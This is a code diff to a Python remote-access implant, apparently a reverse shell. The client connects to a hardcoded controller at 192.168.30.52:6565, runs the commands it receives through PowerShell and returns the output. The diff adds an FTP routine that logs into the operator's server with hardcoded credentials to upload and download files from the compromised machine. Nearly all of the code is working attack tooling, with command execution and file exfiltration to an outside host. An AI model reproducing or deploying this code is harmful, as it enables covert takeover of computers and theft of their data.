@@ -2,15 +2,18 @@ import socket
 import os
 import subprocess
 import getpass
-from pyftpdlib.authorizers import DummyAuthorizer
-from pyftpdlib.handlers import FTPHandler
-from pyftpdlib.servers import FTPServer
-import threading
+from ftplib import FTP
 import time
 
 HOST = "192.168.30.52"
 PORT = 6565
+ftp_username = "Necati"
+ftp_password = "P;F3nj+qXp.N^H8!*=$#kl"
 
+
+def info(f,client):
+    ff = f"\033[32m{f}\033[0m\n"
+    client.send(ff.encode('utf-8'))
 
 
 
@@ -29,38 +32,57 @@ def connect():
         client.send(pwd.encode('utf-8'))
         response = client.recv(40960)
         command = response.decode('utf-8')
-        if command.split(" ")[0] == "cd":
-            os.chdir(command.split(" ")[1])
-        elif command == 'close':
-            client.send(b"\033[32m[*] Connection closed !!!\033[0m\n")
-            break
-        elif command[0:3] == "ftp":
-            create_ftp_server()
-            client.send(b"\033[32m[*] FTP server created\033[0m\n")
-            continue
         try:
+            if command.split(" ")[0] == "cd":
+                os.chdir(command.split(" ")[1])
+            elif command == 'close':
+                info("[*] Connection closed !!!",client)
+                break
+            elif command.split(" ")[0] == "ftp":
+                
+                stdout = ftp_connect(command)
+                info(stdout,client)
+                continue
             stdout = subprocess.check_output(["powershell", "-Command",command])
         except :
-            stdout = b"\033[32m[*] Command Not Found\033[0m\n"
+            stdout = b"\033[32m[*] Command Not Found.\033[0m\n"
+            
         if stdout:
             client.send(stdout)
         else:
             client.send(b"\n")
-    
+        time.sleep(0.3)
 
-def create_ftp_server():
-    authorizer = DummyAuthorizer()
 
-    authorizer.add_user("ccServer", "ccPassword", ".", perm="elradfmw")
 
-    handler = FTPHandler
-    handler.authorizer = authorizer
-    global server
-    server = FTPServer(("0.0.0.0", 21), handler)
-    thred = threading.Thread(target=server.serve_forever)
-    thred.start
-    time.sleep(3)
-    server.close_when_done()
+def ftp_connect(command):
+    try:
+        command_parts = command.split()
+        command_type = command_parts[1]
+        filename = command_parts[2]
+        session = FTP()
+        session.connect(HOST)
+        session.login(user=ftp_username, passwd=ftp_password)
+        
+        if command_type == "-d":
+            # Upload file
+            with open(filename, 'rb') as f:
+                session.storbinary(f'STOR {filename}', f)
+            return f"[*] {filename} downloaded successfully."
+            
+        elif command_type == "-u":
+            # Download file
+            with open(filename, 'wb') as f:
+                session.retrbinary(f'RETR {filename}', f.write)
+            return f"[*] {filename}  uploaded successfully."
+            
+        else:
+            return "[*] Invalid option !!!"
+                
+    except Exception as e:
+        return f"Error: {e}"
+
+
 
 
 
@@ -72,8 +94,6 @@ while 1:
     match command:
             case "connect":
                 connect()
-            case "ftp":
-                ftp()
             case "exit":
                 client.close()
                 break
